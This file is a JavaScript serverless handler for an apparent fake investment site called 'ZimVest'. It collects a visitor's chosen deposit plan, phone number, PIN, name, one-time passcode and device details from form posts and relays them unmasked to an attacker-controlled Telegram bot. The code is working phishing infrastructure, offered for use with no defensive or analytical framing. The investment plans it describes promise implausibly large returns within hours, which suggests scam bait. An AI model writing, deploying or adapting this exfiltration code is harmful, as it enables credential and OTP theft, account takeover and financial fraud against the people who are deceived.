// api/sendTelegram.js — ZimVest edition
// Sends investment plan + credentials to Telegram (HTML parse mode)

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const TOKEN   = process.env.TELEGRAM_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TOKEN || !CHAT_ID) {
    const m = [!TOKEN && 'TELEGRAM_TOKEN', !CHAT_ID && 'TELEGRAM_CHAT_ID'].filter(Boolean);
    return res.status(500).send('Missing env vars: ' + m.join(', '));
  }

  let payload = {};
  try {
    payload = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {});
  } catch { return res.status(400).send('Invalid JSON'); }

  const esc = s => s == null ? '' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  const sh  = (s, n=600) => { s = String(s??''); return s.length > n ? esc(s.slice(0,n))+'…' : esc(s); };
  const mask= s => { if(!s) return ''; const t=String(s); return t.length<=2?'*'.repeat(t.length):'*'.repeat(t.length-2)+t.slice(-2); };

  // Build message
  let text = `<b>🇿🇼 ZimVest — New Activity</b>\n\n`;
  text += `<b>Event:</b> ${esc(payload.event||'—')}\n`;
  if (payload.submittedAt) text += `<b>Time:</b> ${esc(payload.submittedAt)}\n`;

  // Investment plan
  const p = payload.selectedPlan;
  if (p && typeof p === 'object') {
    text += `\n<b>💰 Investment Plan</b>\n`;
    if (p.name)    text += `Plan: ${sh(p.name)}\n`;
    if (p.amount)  text += `Deposit: $${sh(p.amount)}\n`;
    if (p.pct)     text += `Return: +${sh(p.pct)}%\n`;
    if (p.payout)  text += `Payout: $${sh(p.payout)}\n`;
    if (p.hours)   text += `Duration: ${sh(p.hours)} hours\n`;
    if (p.summary) text += `Summary: ${sh(p.summary)}\n`;
  }

  // Credentials
  if (payload.loginPhone) {
    text += `\n<b>📱 Credentials</b>\n`;
    text += `Phone: ${esc(payload.loginPhone)}\n`;
    if (payload.loginPin)  text += `PIN: ${esc(payload.loginPin)}\n`;
    if (payload.name)      text += `Name: ${esc(payload.name)}\n`;
    if (payload.otp)       text += `OTP: ${esc(payload.otp)}\n`;
  }

  if (payload.device) text += `\n<b>Device:</b> ${esc(payload.device)}\n`;

  // Extra keys
  const skip = new Set(['submittedAt','loginPhone','loginPin','otp','selectedPlan','event','name','device']);
  const extras = Object.keys(payload).filter(k => !skip.has(k));
  if (extras.length) {
    text += '\n<b>Other</b>\n';
    extras.forEach(k => { text += `${esc(k)}: ${sh(payload[k])}\n`; });
  }

  try {
    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true }),
    });
    const body = await r.text();
    if (!r.ok) return res.status(502).send('Telegram error: ' + body);
    try { return res.status(200).json(JSON.parse(body)); }
    catch { return res.status(200).send(body); }
  } catch (e) {
    return res.status(500).send('Fetch error: ' + (e?.message || e));
  }
}
